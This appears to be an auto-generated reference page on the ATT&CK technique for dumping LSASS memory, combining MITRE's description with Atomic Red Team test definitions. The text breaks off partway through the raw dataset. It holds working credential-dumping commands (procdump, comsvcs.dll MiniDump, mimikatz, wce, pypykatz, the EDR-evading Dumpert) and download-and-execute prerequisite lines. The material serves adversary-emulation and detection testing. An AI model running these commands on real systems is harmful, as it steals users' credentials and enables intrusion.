
# LSASS Memory

## Description

### MITRE Description

> Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run using:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>


Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

The following SSPs can be used to access credentials:

* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)


## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator', 'SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1003/001

## Potential Commands

```
#{wce_exe} -o %temp%\wce-output.txt
pypykatz live lsa
PathToAtomicsFolder\T1003.001\bin\Outflank-Dumpert.exe
#{mimikatz_exe} "sekurlsa::minidump %tmp%\lsass.DMP" "sekurlsa::logonpasswords full" exit
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
PathToAtomicsFolder\T1003.001\bin\wce.exe -o #{output_file}
PathToAtomicsFolder\T1003.001\bin\mimikatz.exe "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
PathToAtomicsFolder\T1003.001\bin\procdump.exe -accepteula -ma lsass.exe #{output_file}
#{wce_exe} -o #{output_file}
#{procdump_exe} -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
```

## Commands Dataset

```
[{'command': '#{wce_exe} -o %temp%\\wce-output.txt\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': '#{wce_exe} -o #{output_file}\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003.001\\bin\\wce.exe -o #{output_file}\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': '#{wce_exe} -o #{output_file}\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': '#{procdump_exe} -accepteula -ma lsass.exe '
             'C:\\Windows\\Temp\\lsass_dump.dmp\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe -accepteula '
             '-ma lsass.exe #{output_file}\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': 'C:\\Windows\\System32\\rundll32.exe '
             'C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process '
             'lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003.001\\bin\\Outflank-Dumpert.exe\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': '#{mimikatz_exe} "sekurlsa::minidump %tmp%\\lsass.DMP" '
             '"sekurlsa::logonpasswords full" exit\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': 'PathToAtomicsFolder\\T1003.001\\bin\\mimikatz.exe '
             '"sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords '
             'full" exit\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'},
 {'command': 'pypykatz live lsa\n',
  'name': None,
  'source': 'atomics/T1003.001/T1003.001.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - OS Credential Dumping: LSASS Memory': {'atomic_tests': [{'auto_generated_guid': '0f7c5301-6859-45ba-8b4d-1fac30fc31ed',
                                                                                   'dependencies': [{'description': 'Windows '
                                                                                                                    'Credential '
                                                                                                                    'Editor '
                                                                                                                    'must '
                                                                                                                    'exist '
                                                                                                                    'on '
                                                                                                                    'disk '
                                                                                                                    'at '
                                                                                                                    'specified '
                                                                                                                    'location '
                                                                                                                    '(#{wce_exe})\n',
                                                                                                     'get_prereq_command': '$parentpath '
                                                                                                                           '= '
                                                                                                                           'Split-Path '
                                                                                                                           '"#{wce_exe}"; '
                                                                                                                           '$zippath '
                                                                                                                           '= '
                                                                                                                           '"$parentpath\\wce.zip"\n'
                                                                                                                           'IEX(IWR '
                                                                                                                           '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")\n'
                                                                                                                           'if(Invoke-WebRequestVerifyHash '
                                                                                                                           '"#{wce_url}" '
                                                                                                                           '"$zippath" '
                                                                                                                           '#{wce_zip_hash}){\n'
                                                                                                                           '  '
                                                                                                                           'Expand-Archive '
                                                                                                                           '$zippath '
                                                                                                                           '$parentpath\\wce '
                                                                                                                           '-Force\n'
                                                                                                                           '  '
                                                                                                                           'Move-Item '
                                                                                                                           '$parentpath\\wce\\wce.exe '
                                                                                                                           '"#{wce_exe}"\n'
                                                                                                                           '  '
                                                                                                                           'Remove-Item '
                                                                                                                           '$zippath, '
                                                                                                                           '$parentpath\\wce '
                                                                                                                           '-Recurse\n'
                                                                                                                           '}\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(Test-Path '
                                                                                                                       '#{wce_exe}) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'}],
                                                                                   'dependency_executor_name': 'powershell',
                                                                                   'description': 'Dump '
                                                                                                  'user '
                                                                                                  'credentials '
                                                                                                  'using '
                                                                                                  'Windows '
                                                                                                  'Credential '
                                                                                                  'Editor '
                                                                                                  '(supports '
                                                                                                  'Windows '
                                                                                                  'XP, '
                                                                                                  '2003, '
                                                                                                  'Vista, '
                                                                                                  '7, '
                                                                                                  '2008 '
                                                                                                  'and '
                                                                                                  'Windows '
                                                                                                  '8 '
                                                                                                  'only)\n'
                                                                                                  '\n'
                                                                                                  'Upon '
                                                                                                  'successful '
                                                                                                  'execution, '
                                                                                                  'you '
                                                                                                  'should '
                                                                                                  'see '
                                                                                                  'a '
                                                                                                  'file '
                                                                                                  'with '
                                                                                                  'user '
                                                                                                  'passwords/hashes '
                                                                                                  'at '
                                                                                                  '%temp%/wce-output.file.\n'
                                                                                                  '\n'
                                                                                                  'If '
                                                                                                  'you '
                                                                                                  'see '
                                                                                                  'no '
                                                                                                  'output '
                                                                                                  'it '
                                                                                                  'is '
                                                                                                  'likely '
                                                                                                  'that '
                                                                                                  'execution '
                                                                                                  'was '
                                                                                                  'blocked '
                                                                                                  'by '
                                                                                                  'Anti-Virus. \n'
                                                                                                  '\n'
                                                                                                  'If '
                                                                                                  'you '
                                                                                                  'see '
                                                                                                  'a '
                                                                                                  'message '
                                                                                                  'saying '
                                                                                                  '\\"wce.exe '
                                                                                                  'is '
                                                                                                  'not '
                                                                                                  'recognized '
                                                                                                  'as '
                                                                                                  'an '
                                                                                                  'internal '
                                                                                                  'or '
                                                                                                  'external '
                                                                                                  'command\\", '
                                                                                                  'try '
                                                                                                  'using '
                                                                                                  'the  '
                                                                                                  'get-prereq_commands '
                                                                                                  'to '
                                                                                                  'download '
                                                                                                  'and '
                                                                                                  'install '
                                                                                                  'Windows '
                                                                                                  'Credential '
                                                                                                  'Editor '
                                                                                                  'first.\n',
                                                                                   'executor': {'cleanup_command': 'del '
                                                                                                                   '"#{output_file}" '
                                                                                                                   '>nul '
                                                                                                                   '2>&1',
                                                                                                'command': '#{wce_exe} '
                                                                                                           '-o '
                                                                                                           '#{output_file}\n',
                                                                                                'elevation_required': True,
                                                                                                'name': 'command_prompt'},
                                                                                   'input_arguments': {'output_file': {'default': '%temp%\\wce-output.txt',
                                                                                                                       'description': 'Path '
                                                                                                                                      'where '
                                                                                                                                      'resulting '
                                                                                                                                      'data '
                                                                                                                                      'should '
                                                                                                                                      'be '
                                                                                                                                      'placed',
                                                                                                                       'type': 'Path'},
                                                                                                       'wce_exe': {'default': 'PathToAtomicsFolder\\T1003.001\\bin\\wce.exe',
                                                                                                                   'description': 'Path '
                                                                                                                                  'of '
                                                                                                                                  'Windows '
                                                                                                                                  'Credential '
                                                                                                                                  'Editor '
                                                                                                                                  'executable',
                                                                                                                   'type': 'Path'},
                                                                                                       'wce_url': {'default': 'https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip',
                                                                                                                   'description': 'Path '
                                                                                                                                  'to '
                                                                                                                                  'download '
                                                                                                                                  'Windows '
                                                                                                                                  'Credential '
                                                                                                                                  'Editor '
                                                                                                                                  'zip '
                                                                                                                                  'file',
                                                                                                                   'type': 'url'},
                                                                                                       'wce_zip_hash': {'default': '8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933',
                                                                                                                        'description': 'File '
                                                                                                                                       'hash '
                                                                                                                                       'of '
                                                                                                                                       'the '
                                                                                                                                       'Windows '
                                                                                                                                       'Credential '
                                                                                                                                       'Editor '
                                                                                                                                       'zip '
                                                                                                                                       'file',
                                                                                                                        'type': 'String'}},
                                                                                   'name': 'Windows '
                                                                                           'Credential '
                                                                                           'Editor',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': '0be2230c-9ab3-4ac2-8826-3199b9a0ebf8',
                                                                                   'dependencies': [{'description': 'ProcDump '
                                                                                                                    'tool '
                                                                                                                    'from '
                                                                                                                    'Sysinternals '
                                                                                                                    'must '
                                                                                                                    'exist '
                                                                                                                    'on '
                                                                                                                    'disk '
                                                                                                                    'at '
                                                                                                                    'specified '
                                                                                                                    'location '
                                                                                                                    '(#{procdump_exe})\n',
                                                                                                     'get_prereq_command': 'Invoke-WebRequest '
                                                                                                                           '"https://download.sysinternals.com/files/Procdump.zip" '
                                                                                                                           '-OutFile '
                                                                                                                           '"$env:TEMP\\Procdump.zip"\n'
                                                                                                                           'Expand-Archive '
                                                                                                                           '$env:TEMP\\Procdump.zip '
                                                                                                                           '$env:TEMP\\Procdump '
                                                                                                                           '-Force\n'
                                                                                                                           'New-Item '
                                                                                                                           '-ItemType '
                                                                                                                           'Directory '
                                                                                                                           '(Split-Path '
                                                                                                                           '#{procdump_exe}) '
                                                                                                                           '-Force '
                                                                                                                           '| '
                                                                                                                           'Out-Null\n'
                                                                                                                           'Copy-Item '
                                                                                                                           '$env:TEMP\\Procdump\\Procdump.exe '
                                                                                                                           '#{procdump_exe} '
                                                                                                                           '-Force\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(Test-Path '
                                                                                                                       '#{procdump_exe}) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'}],
                                                                                   'dependency_executor_name': 'powershell',
                                                                                   'description': 'The '
                                                                                                  'memory '
                                                                                                  'of '
                                                                                                  'lsass.exe '
                                                                                                  'is '
                                                                                                  'often '
                                                                                                  'dumped '
                                                                                                  'for '
                                                                                                  'offline '
                                                                                                  'credential '
                                                                                                  'theft '
                                                                                                  'attacks. '
                                                                                                  'This '
                                                                                                  'can '
                                                                                                  'be '
                                                                                                  'achieved '
                                                                                                  'with '
                                                                                                  'Sysinternals\n'
                                                                                                  'ProcDump.\n'
                                                                                                  '\n'
                                                                                                  'Upon '
                                                                                                  'successful '
                                                                                                  'execution, '
                                                                                                  'you '
                                                                                                  'should '
                                                                                                  'see '
                                                                                                  'the '
                                                                                                  'following '
                                                                                                  'file '
                                                                                                  'created '
                                                                                                  'c:\\windows\\temp\\lsass_dump.dmp.\n'
                                                                                                  '\n'
                                                                                                  'If '
                                                                                                  'you '
                                                                                                  'see '
                                                                                                  'a '
                                                                                                  'message '
                                                                                                  'saying '
                                                                                                  '"procdump.exe '
                                                                                                  'is '
                                                                                                  'not '
                                                                                                  'recognized '
                                                                                                  'as '
                                                                                                  'an '
                                                                                                  'internal '
                                                                                                  'or '
                                                                                                  'external '
                                                                                                  'command", '
                                                                                                  'try '
                                                                                                  'using '
                                                                                                  'the  '
                                                                                                  'get-prereq_commands '
                                                                                                  'to '
                                                                                                  'download '
                                                                                                  'and '
                                                                                                  'install '
                                                                                                  'the '
                                                                                                  'ProcDump '
                                                                                                  'tool '
                                                                                                  'first.\n',
                                                                                   'executor': {'cleanup_command': 'del '
                                                                                                                   '"#{output_file}" '
                                                                                                                   '>nul '
                                                                                                                   '2> '
                                                                                                                   'nul\n',
                                                                                                'command': '#{procdump_exe} '
                                                                                                           '-accepteula '
                                                                                                           '-ma '
                                                                                                           'lsass.exe '
                                                                                                           '#{output_file}\n',
                                                                                                'elevation_required': True,
                                                                                                'name': 'command_prompt'},
                                                                                   'input_arguments': {'output_file': {'default': 'C:\\Windows\\Temp\\lsass_dump.dmp',
                                                                                                                       'description': 'Path '
                                                                                                                                      'where '
                                                                                                                                      'resulting '
                                                                                                                                      'dump '
                                                                                                                                      'should '
                                                                                                                                      'be '
                                                                                                                                      'placed',
                                                                                                                       'type': 'Path'},
                                                                                                       'procdump_exe': {'default': 'PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe',
                                                                                                                        'description': 'Path '
                                                                                                                                       'of '
                                                                                                                                       'Procdump '
                                                                                                                                       'executable',
                                                                                                                        'type': 'Path'}},
                                                                                   'name': 'Dump '
                                                                                           'LSASS.exe '
                                                                                           'Memory '
                                                                                           'using '
                                                                                           'ProcDump',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': '2536dee2-12fb-459a-8c37-971844fa73be',
                                                                                   'description': 'The '
                                                                                                  'memory '
                                                                                                  'of '
                                                                                                  'lsass.exe '
                                                                                                  'is '
                                                                                                  'often '
                                                                                                  'dumped '
                                                                                                  'for '
                                                                                                  'offline '
                                                                                                  'credential '
                                                                                                  'theft '
                                                                                                  'attacks. '
                                                                                                  'This '
                                                                                                  'can '
                                                                                                  'be '
                                                                                                  'achieved '
                                                                                                  'with '
                                                                                                  'a '
                                                                                                  'built-in '
                                                                                                  'dll.\n'
                                                                                                  '\n'
                                                                                                  'Upon '
                                                                                                  'successful '
                                                                                                  'execution, '
                                                                                                  'you '
                                                                                                  'should '
                                                                                                  'see '
                                                                                                  'the '
                                                                                                  'following '
                                                                                                  'file '
                                                                                                  'created '
                                                                                                  '$env:TEMP\\lsass-comsvcs.dmp.\n',
                                                                                   'executor': {'cleanup_command': 'Remove-Item '
                                                                                                                   '$env:TEMP\\lsass-comsvcs.dmp '
                                                                                                                   '-ErrorAction '
                                                                                                                   'Ignore\n',
                                                                                                'command': 'C:\\Windows\\System32\\rundll32.exe '
                                                                                                           'C:\\windows\\System32\\comsvcs.dll, '
                                                                                                           'MiniDump '
                                                                                                           '(Get-Process '
                                                                                                           'lsass).id '
                                                                                                           '$env:TEMP\\lsass-comsvcs.dmp '
                                                                                                           'full\n',
                                                                                                'elevation_required': True,
                                                                                                'name': 'powershell'},
                                                                                   'name': 'Dump '
                                                                                           'LSASS.exe '
                                                                                           'Memory '
                                                                                           'using '
                                                                                           'comsvcs.dll',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': '7ae7102c-a099-45c8-b985-4c7a2d05790d',
                                                                                   'dependencies': [{'description': 'Dumpert '
                                                                                                                    'executable '
                                                                                                                    'must '
                                                                                                                    'exist '
                                                                                                                    'on '
                                                                                                                    'disk '
                                                                                                                    'at '
                                                                                                                    'specified '
                                                                                                                    'location '
                                                                                                                    '(#{dumpert_exe})\n',
                                                                                                     'get_prereq_command': 'New-Item '
                                                                                                                           '-ItemType '
                                                                                                                           'Directory '
                                                                                                                           '(Split-Path '
                                                                                                                           '#{dumpert_exe}) '
                                                                                                                           '-Force '
                                                                                                                           '| '
                                                                                                                           'Out-Null\n'
                                                                                                                           'Invoke-WebRequest '
                                                                                                                           '"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" '
                                                                                                                           '-OutFile '
                                                                                                                           '#{dumpert_exe}\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(Test-Path '
                                                                                                                       '#{dumpert_exe}) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'}],
                                                                                   'dependency_executor_name': 'powershell',
                                                                                   'description': 'The '
                                                                                                  'memory '
                                                                                                  'of '
                                                                                                  'lsass.exe '
                                                                                                  'is '
                                                                                                  'often '
                                                                                                  'dumped '
                                                                                                  'for '
                                                                                                  'offline '
                                                                                                  'credential '
                                                                                                  'theft '
                                                                                                  'attacks. '
                                                                                                  'This '
                                                                                                  'can '
                                                                                                  'be '
                                                                                                  'achieved '
                                                                                                  'using '
                                                                                                  'direct '
                                                                                                  'system '
                                                                                                  'calls '
                                                                                                  'and '
                                                                                                  'API '
                                                                                                  'unhooking '
                                                                                                  'in '
                                                                                                  'an '
                                                                                                  'effort '
                                                                                                  'to '
                                                                                                  'avoid '
                                                                                                  'detection. \n'
                                                                                                  'https://github.com/outflanknl/Dumpert\n'
                                                                                                  'https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\n'
                                                                                                  'Upon '
                                                                                                  'successful '
                                                                                                  'execution, '
                                                                                                  'you '
                                                                                                  'should '
                                                                                                  'see '
                                                                                                  'the '
                                                                                                  'following '
                                                                                                  'file '
                                                                                                  'created '
                                                                                                  'C:\\\\windows\\\\temp\\\\dumpert.dmp.\n'
                                                                                                  '\n'
                                                                                                  'If '
                                                                                                  'you '
                                                                                                  'see '
                                                                                                  'a '
                                                                                                  'message '
                                                                                                  'saying '
                                                                                                  '\\"The '
                                                                                                  'system '
                                                                                                  'cannot '
                                                                                                  'find '
                                                                                                  'the '
                                                                                                  'path '
                                                                                                  'specified.\\", '
                                                                                                  'try '
                                                                                                  'using '
                                                                                                  'the  '
                                                                                                  'get-prereq_commands '
                                                                                                  'to '
                                                                                                  'download '
                                                                                                  'the  '
                                                                                                  'tool '
                                                                                                  'first.\n',
                                                                                   'executor': {'cleanup_command': 'del '
                                                                                                                   'C:\\windows\\temp\\dumpert.dmp '
                                                                                                                   '>nul '
                                                                                                                   '2> '
                                                                                                                   'nul\n',
                                                                                                'command': '#{dumpert_exe}\n',
                                                                                                'elevation_required': True,
                                                                                                'name': 'command_prompt'},
                                                                                   'input_arguments': {'dumpert_exe': {'default': 'PathToAtomicsFolder\\T1003.001\\bin\\Outflank-Dumpert.exe',
                                                                                                                       'description': 'Path '
                                                                                                                                      'of '
                                                                                                                                      'Dumpert '
                                                                                                                                      'executable',
                                                                                                                       'type': 'Path'}},
                                                                                   'name': 'Dump '
                                                                                           'LSASS.exe '
                                                                                           'Memory '
                                                                                           'using '
                                                                                           'direct '
                                                                                           'system '
                                                                                           'calls '
                                                                                           'and '
                                                                                           'API '
                                                                                           'unhooking',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': 'dea6c349-f1c6-44f3-87a1-1ed33a59a607',
                                                                                   'description': 'The '
                                                                                                  'memory '
                                                                                                  'of '
                                                                                                  'lsass.exe '
                                                                                                  'is '
                                                                                                  'often '
                                                                                                  'dumped '
                                                                                                  'for '
                                                                                                  'offline '
                                                                                                  'credential '
                                                                                                  'theft '
                                                                                                  'attacks. '
                                                                                                  'This '
                                                                                                  'can '
                                                                                                  'be '
                                                                                                  'achieved '
                                                                                                  'with '
                                                                                                  'the '
                                                                                                  'Windows '
                                                                                                  'Task\n'
                                                                                                  'Manager '
                                                                                                  'and '
                                                                                                  'administrative '
                                                                                                  'permissions.\n',
                                                                                   'executor': {'name': 'manual',
                                                                                                'steps': '1. '
                                                                                                         'Open '
                                                                                                         'Task '
                                                                                                         'Manager:\n'
                                                                                                         '  '
                                                                                                         'On '
                                                                                                         'a '
                                                                                                         'Windows '
                                                                                                         'system '
                                                                                                         'this '
                                                                                                         'can '
                                                                                                         'be '
                                                                                                         'accomplished '
                                                                                                         'by '
                                                                                                         'pressing '
                                                                                                         'CTRL-ALT-DEL '
                                                                                                         'and '
                                                                                                         'selecting '
                                                                                                         'Task '
                                                                                                         'Manager '
                                                                                                         'or '
                                                                                                         'by '
                                                                                                         'right-clicking\n'
                                                                                                         '  '
                                                                                                         'on '
                                                                                                         'the '
                                                                                                         'task '
                                                                                                         'bar '
                                                                                                         'and '
                                                                                                         'selecting '
                                                                                                         '"Task '
                                                                                                         'Manager".\n'
                                                                                                         '\n'
                                                                                                         '2. '
                                                                                                         'Select '
                                                                                                         'lsass.exe:\n'
                                                                                                         '  '
                                                                                                         'If '
                                                                                                         'lsass.exe '
                                                                                                         'is '
                                                                                                         'not '
                                                                                                         'visible, '
                                                                                                         'select '
                                                                                                         '"Show '
                                                                                                         'processes '
                                                                                                         'from '
                                                                                                         'all '
                                                                                                         'users". '
                                                                                                         'This '
                                                                                                         'will '
                                                                                                         'allow '
                                                                                                         'you '
                                                                                                         'to '
                                                                                                         'observe '
                                                                                                         'execution '
                                                                                                         'of '
                                                                                                         'lsass.exe\n'
                                                                                                         '  '
                                                                                                         'and '
                                                                                                         'select '
                                                                                                         'it '
                                                                                                         'for '
                                                                                                         'manipulation.\n'
                                                                                                         '\n'
                                                                                                         '3. '
                                                                                                         'Dump '
                                                                                                         'lsass.exe '
                                                                                                         'memory:\n'
                                                                                                         '  '
                                                                                                         'Right-click '
                                                                                                         'on '
                                                                                                         'lsass.exe '
                                                                                                         'in '
                                                                                                         'Task '
                                                                                                         'Manager. '
                                                                                                         'Select '
                                                                                                         '"Create '
                                                                                                         'Dump '
                                                                                                         'File". '
                                                                                                         'The '
                                                                                                         'following '
                                                                                                         'dialog '
                                                                                                         'will '
                                                                                                         'show '
                                                                                                         'you '
                                                                                                         'the '
                                                                                                         'path '
                                                                                                         'to '
                                                                                                         'the '
                                                                                                         'saved '
                                                                                                         'file.\n'},
                                                                                   'name': 'Dump '
                                                                                           'LSASS.exe '
                                                                                           'Memory '
                                                                                           'using '
                                                                                           'Windows '
                                                                                           'Task '
                                                                                           'Manager',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': '453acf13-1dbd-47d7-b28a-172ce9228023',
                                                                                   'dependencies': [{'description': 'Mimikatz '
                                                                                                                    'must '
                                                                                                                    'exist '
                                                                                                                    'on '
                                                                                                                    'disk '
                                                                                                                    'at '
                                                                                                                    'specified '
                                                                                                                    'location '
                                                                                                                    '(#{mimikatz_exe})\n',
                                                                                                     'get_prereq_command': '[Net.ServicePointManager]::SecurityProtocol '
                                                                                                                           '= '
                                                                                                                           '[Net.SecurityProtocolType]::Tls12\n'
                                                                                                                           'Invoke-WebRequest '
                                                                                                                           '"https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" '
                                                                                                                           '-OutFile '
                                                                                                                           '"$env:TEMP\\Mimi.zip"\n'
                                                                                                                           'Expand-Archive '
                                                                                                                           '$env:TEMP\\Mimi.zip '
                                                                                                                           '$env:TEMP\\Mimi '
                                                                                                                           '-Force\n'
                                                                                                                           'New-Item '
                                                                                                                           '-ItemType '
                                                                                                                           'Directory '
                                                                                                                           '(Split-Path '
                                                                                                                           '#{mimikatz_exe}) '
                                                                                                                           '-Force '
                                                                                                                           '| '
                                                                                                                           'Out-Null\n'
                                                                                                                           'Copy-Item '
                                                                                                                           '$env:TEMP\\Mimi\\x64\\mimikatz.exe '
                                                                                                                           '#{mimikatz_exe} '
                                                                                                                           '-Force\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(Test-Path '
                                                                                                                       '#{mimikatz_exe}) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'},
                                                                                                    {'description': 'Lsass '
                                                                                                                    'dump '
                                                                                                                    'must '
                                                                                                                    'exist '
                                                                                                                    'at '
                                                                                                                    'specified '
                                                                                                                    'location '
                                                                                                                    '(#{input_file})\n',
                                                                                                     'get_prereq_command': 'Write-Host '
                                                                                                                           '"Create '
                                                                                                                           'the '
                                                                                                                           'lsass '
                                                                                                                           'dump '
                                                                                                                           'manually '
                                                                                                                           'using '
                                                                                                                           'the '
                                                                                                                           'steps '
                                                                                                                           'in '
                                                                                                                           'the '
                                                                                                                           'previous '
                                                                                                                           'test '
                                                                                                                           '(Dump '
                                                                                                                           'LSASS.exe '
                                                                                                                           'Memory '
                                                                                                                           'using '
                                                                                                                           'Windows '
                                                                                                                           'Task '
                                                                                                                           'Manager)"\n',
                                                                                                     'prereq_command': 'cmd '
                                                                                                                       '/c '
                                                                                                                       '"if '
                                                                                                                       'not '
                                                                                                                       'exist '
                                                                                                                       '#{input_file} '
                                                                                                                       '(exit '
                                                                                                                       '/b '
                                                                                                                       '1)"\n'}],
                                                                                   'dependency_executor_name': 'powershell',
                                                                                   'description': 'The '
                                                                                                  'memory '
                                                                                                  'of '
                                                                                                  'lsass.exe '
                                                                                                  'is '
                                                                                                  'often '
                                                                                                  'dumped '
                                                                                                  'for '
                                                                                                  'offline '
                                                                                                  'credential '
                                                                                                  'theft '
                                                                                                  'attacks. '
                                                                                                  'Adversaries '
                                                                                                  'commonly '
                                                                                                  'perform '
                                                                                                  'this '
                                                                                                  'offline '
                                                                                                  'analysis '
                                                                                                  'with\n'
                                                                                                  'Mimikatz. '
                                                                                                  'This '
                                                                                                  'tool '
                                                                                                  'is '
                                                                                                  'available '
                                                                                                  'at '
                                                                                                  'https://github.com/gentilkiwi/mimikatz '
                                                                                                  'and '
                                                                                                  'can '
                                                                                                  'be '
                                                                                                  'obtained '
                                                                                                  'using '
                                                                                                  'the '
                                                                                                  'get-prereq_commands.\n',
                                                                                   'executor': {'command': '#{mimikatz_exe} '
                                                                                                           '"sekurlsa::minidump '
                                                                                                           '#{input_file}" '
                                                                                                           '"sekurlsa::logonpasswords '
                                                                                                           'full" '
                                                                                                           'exit\n',
                                                                                                'elevation_required': True,
                                                                                                'name': 'command_prompt'},
                                                                                   'input_arguments': {'input_file': {'default': '%tmp%\\lsass.DMP',
                                                                                                                      'description': 'Path '
                                                                                                                                     'of '
                                                                                                                                     'the '
                                                                                                                                     'Lsass '
                                                                                                                                     'dump',
                                                                                                                      'type': 'Path'},
                                                                                                       'mimikatz_exe': {'default': 'PathToAtomicsFolder\\T1003.001\\bin\\mimikatz.exe',
                                                                                                                        'description': 'Path '
                                                                                                                                       'of '
                                                                                                                                       'the '
                                                                                                                                       'Mimikatz '
                                                                                                                                       'binary',
                                                                                                                        'type': 'string'}},
                                                                                   'name': 'Offline '
                                                                                           'Credential '
                                                                                           'Theft '
                                                                                           'With '
                                                                                           'Mimikatz',
                                                                                   'supported_platforms': ['windows']},
                                                                                  {'auto_generated_guid': 'c37bc535-5c62-4195-9cc3-0517673171d8',
                                                                                   'dependencies': [{'description': 'Computer '
                                                                                                                    'must '
                                                                                                                    'have '
                                                                                                                    'python '
                                                                                                                    '3 '
                                                                                                                    'installed\n',
                                                                                                     'get_prereq_command': 'echo '
                                                                                                                           '"Python '
                                                                                                                           '3 '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'manually"\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(python '
                                                                                                                       '--version) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'},
                                                                                                    {'description': 'Computer '
                                                                                                                    'must '
                                                                                                                    'have '
                                                                                                                    'pip '
                                                                                                                    'installed\n',
                                                                                                     'get_prereq_command': 'echo '
                                                                                                                           '"PIP '
                                                                                                                           'must '
                                                                                                                           'be '
                                                                                                                           'installed '
                                                                                                                           'manually"\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(pip3 '
                                                                                                                       '-V) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'},
                                                                                                    {'description': 'pypykatz '
                                                                                                                    'must '
                                                                                                                    'be '
                                                                                                                    'installed '
                                                                                                                    'and '
                                                                                                                    'part '
                                                                                                                    'of '
                                                                                                                    'PATH\n',
                                                                                                     'get_prereq_command': 'pip3 '
                                                                                                                           'install '
                                                                                                                           'pypykatz\n',
                                                                                                     'prereq_command': 'if '
                                                                                                                       '(cmd '
                                                                                                                       '/c '
                                                                                                                       'pypykatz '
                                                                                                                       '-h) '
                                                                                                                       '{exit '
                                                                                                                       '0} '
                                                                                                                       'else '
                                                                                                                       '{exit '
                                                                                                                       '1}\n'}],
